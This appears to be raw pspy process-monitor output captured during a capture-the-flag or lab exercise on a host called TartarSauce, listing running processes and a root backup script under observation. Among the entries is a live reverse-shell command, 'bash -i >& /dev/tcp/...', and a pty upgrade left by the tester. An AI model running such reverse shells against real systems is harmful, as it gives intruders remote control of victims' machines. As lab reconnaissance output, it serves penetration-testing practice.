onuma@TartarSauce:/dev/shm$ ./pspy32
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/03/30 12:24:20 CMD: UID=0    PID=992    | /usr/lib/policykit-1/polkitd --no-debug
2021/03/30 12:24:20 CMD: UID=0    PID=1567   |
2021/03/30 12:24:20 CMD: UID=33   PID=1555   | /bin/bash
2021/03/30 12:24:20 CMD: UID=33   PID=1553   | python3 -c import pty; pty.spawn("/bin/bash")
2021/03/30 12:24:20 CMD: UID=0    PID=15     |
2021/03/30 12:24:20 CMD: UID=33   PID=1444   | bash -i
2021/03/30 12:24:20 CMD: UID=33   PID=1443   | bash -c bash -i >& /dev/tcp/10.10.14.78/443 0>&1
2021/03/30 12:24:20 CMD: UID=33   PID=1442   |
2021/03/30 12:24:20 CMD: UID=33   PID=1441   | /usr/sbin/apache2 -k start
2021/03/30 12:24:20 CMD: UID=0    PID=14     |
2021/03/30 12:24:20 CMD: UID=0    PID=13     |
2021/03/30 12:24:20 CMD: UID=33   PID=1223   | /usr/sbin/apache2 -k start
2021/03/30 12:24:20 CMD: UID=33   PID=1222   | /usr/sbin/apache2 -k start
2021/03/30 12:24:20 CMD: UID=33   PID=1221   | /usr/sbin/apache2 -k start
2021/03/30 12:24:20 CMD: UID=33   PID=1220   | /usr/sbin/apache2 -k start
2021/03/30 12:24:20 CMD: UID=33   PID=1219   | /usr/sbin/apache2 -k start
2021/03/30 12:24:20 CMD: UID=0    PID=1215   | /usr/sbin/apache2 -k start
2021/03/30 12:24:20 CMD: UID=0    PID=12     |
2021/03/30 12:24:20 CMD: UID=0    PID=1160   | /sbin/agetty --noclear tty1 linux
2021/03/30 12:24:20 CMD: UID=107  PID=1132   | /usr/sbin/mysqld
2021/03/30 12:24:20 CMD: UID=0    PID=1124   | /sbin/iscsid
2021/03/30 12:24:20 CMD: UID=0    PID=1123   | /sbin/iscsid
2021/03/30 12:24:20 CMD: UID=0    PID=112    |
2021/03/30 12:24:20 CMD: UID=0    PID=11     |
2021/03/30 12:24:20 CMD: UID=0    PID=10     |
2021/03/30 12:24:20 CMD: UID=0    PID=1      | /sbin/init
2021/03/30 12:24:54 CMD: UID=0    PID=3445   | /lib/systemd/systemd-udevd
2021/03/30 12:24:54 CMD: UID=0    PID=3444   | /lib/systemd/systemd-udevd
2021/03/30 12:24:54 CMD: UID=0    PID=3443   | /lib/systemd/systemd-udevd
2021/03/30 12:24:54 CMD: UID=0    PID=3442   | /lib/systemd/systemd-udevd
2021/03/30 12:24:54 CMD: UID=0    PID=3441   | cut -d  -f1
2021/03/30 12:24:54 CMD: UID=0    PID=3440   | sha1sum
2021/03/30 12:24:54 CMD: UID=0    PID=3439   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3438   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3437   | /lib/systemd/systemd-udevd
2021/03/30 12:24:54 CMD: UID=0    PID=3436   | /lib/systemd/systemd-udevd
2021/03/30 12:24:54 CMD: UID=0    PID=3435   | /lib/systemd/systemd-udevd
2021/03/30 12:24:54 CMD: UID=0    PID=3434   | /lib/systemd/systemd-udevd
2021/03/30 12:24:54 CMD: UID=0    PID=3433   | /lib/systemd/systemd-udevd
2021/03/30 12:24:54 CMD: UID=0    PID=3432   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3448   | seq 72
2021/03/30 12:24:54 CMD: UID=0    PID=3447   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3446   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3450   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3451   |
2021/03/30 12:24:54 CMD: UID=0    PID=3453   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3458   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3460   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3462   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3463   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3464   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3465   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3466   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3467   | /bin/bash /usr/sbin/backuperer
